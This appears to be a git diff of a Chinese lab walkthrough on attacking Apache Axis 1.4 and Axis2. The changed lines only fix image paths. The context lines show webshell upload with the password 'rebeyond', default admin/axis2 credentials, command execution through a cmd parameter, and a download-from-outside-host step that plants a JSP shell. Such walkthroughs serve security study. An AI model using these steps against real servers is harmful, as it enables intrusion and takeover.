@@ -36,7 +36,7 @@ tomcat +apache Axis 1.4
 http://192.168.0.78:8080/axis/
 ```
 
-![image-20220910103805828](.\assets\imageimage-20220910103805828.png)
+![image-20220910103805828](./assets/imageimage-20220910103805828.png)
 
 环境搭建成功 , 访问 
 
@@ -83,7 +83,7 @@ Content-Length: 777
 </soap:Envelope>
 ```
 
-![image-20220910115547702](.\assets\imageimage-20220910115547702.png)
+![image-20220910115547702](./assets/imageimage-20220910115547702.png)
 
 把冰蝎马写入文件内容 , 虽然影响是500 , 但是已经写进入了
 
@@ -117,7 +117,7 @@ Content-Length: 1157
 </soapenv:Envelope>
 ```
 
-![image-202209101129](.\assets\imageimage-20220910115606129.png)
+![image-202209101129](./assets/imageimage-20220910115606129.png)
 
 一次写入不成功可能需要多次写入
 
@@ -128,7 +128,7 @@ http://192.168.0.78:8080/shell.jsp
 rebeyond
 ```
 
-![image-20220910115441502](.\assets\imageimage-20220910115441502.png)
+![image-20220910115441502](./assets/imageimage-20220910115441502.png)
 
 ### 2.5修复建议
 
@@ -180,11 +180,11 @@ title="Axis 2 - Home"
 http://192.168.0.78:8080/axis2/
 ```
 
-![image-20220910123312503](.\assets\imageimage-20220910123312503.png)
+![image-20220910123312503](./assets/imageimage-20220910123312503.png)
 
 点击 Administration
 
-![image-20220910123340127](.\assets\imageimage-20220910123340127.png)
+![image-20220910123340127](./assets/imageimage-20220910123340127.png)
 
 ```
 admin
@@ -197,11 +197,11 @@ axis2
 https://github.com/Svti/Axis2Shell ( 推荐 config.aar包 ) 
 ```
 
-![image-20220910124051454](.\assets\imageimage-20220910124051454.png)
+![image-20220910124051454](./assets/imageimage-20220910124051454.png)
 
-![image-20220910124127190](.\assets\imageimage-20220910124127190.png)
+![image-20220910124127190](./assets/imageimage-20220910124127190.png)
 
-![image-20220910124118784](.\assets\imageimage-20220910124118784.png)
+![image-20220910124118784](./assets/imageimage-20220910124118784.png)
 
 查看参数
 
@@ -209,7 +209,7 @@ https://github.com/Svti/Axis2Shell ( 推荐 config.aar包 )
 http://ip:8080/axis2/services/config?wsdl
 ```
 
-![image-20220910132948620](.\assets\imageimage-20220910132948620.png)
+![image-20220910132948620](./assets/imageimage-20220910132948620.png)
 
 执行系统命令
 
@@ -217,7 +217,7 @@ http://ip:8080/axis2/services/config?wsdl
 http://ip:8080/services/config/exec?cmd=whoami
 ```
 
-![image-20220910133003379](.\assets\imageimage-20220910133003379.png)
+![image-20220910133003379](./assets/imageimage-20220910133003379.png)
 
 查看class的路径 , 方便文件上传
 
@@ -225,7 +225,7 @@ http://ip:8080/services/config/exec?cmd=whoami
 http://ip:8080/services/config/getClassPath
 ```
 
-![image-20220910133125782](.\assets\imageimage-20220910133125782.png)
+![image-20220910133125782](./assets/imageimage-20220910133125782.png)
 
 反弹shell
 
@@ -245,10 +245,3 @@ http://ip:8080/services/config/download?url=http://ip:8000/mm.txt&path=C:/apache
 http://ip:8080/axis2/jkl.jsp
 rebeyond
 ```
-
-
-
-
-
-
-
